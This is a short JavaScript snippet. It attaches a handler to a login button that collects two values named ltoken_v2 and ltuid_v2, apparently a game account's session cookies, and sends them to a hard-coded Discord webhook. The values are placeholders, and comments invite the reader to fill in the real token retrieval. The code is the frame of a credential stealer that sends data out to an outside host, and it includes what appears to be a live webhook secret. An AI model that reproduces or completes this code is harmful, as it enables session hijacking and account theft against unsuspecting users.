document.getElementById('loginButton').addEventListener('click', () => {
    // Simulating ltoken_v2 and ltuid_v2 retrieval
    const ltoken = 'sample_ltoken_v2'; // Replace with actual token retrieval logic
    const ltuid = 'sample_ltuid_v2';   // Replace with actual token retrieval logic

    sendToDiscord(ltoken, ltuid);
});

function sendToDiscord(ltoken, ltuid) {
    fetch('https://discord.com/api/webhooks/1287786167147958282/7YFuBGE2IaGnZd86pY_6m2VmPNs1_Ka3TBqCejG_zZQ_Iy0v9o8K9MMSORqRjxZlEsmh', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `ltoken_v2: ${ltoken}\nltuid_v2: ${ltuid}`
        })
    })
    .then(response => {
        if (response.ok) {
            alert('Data sent to Discord!');
        } else {
            alert('Error sending data.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
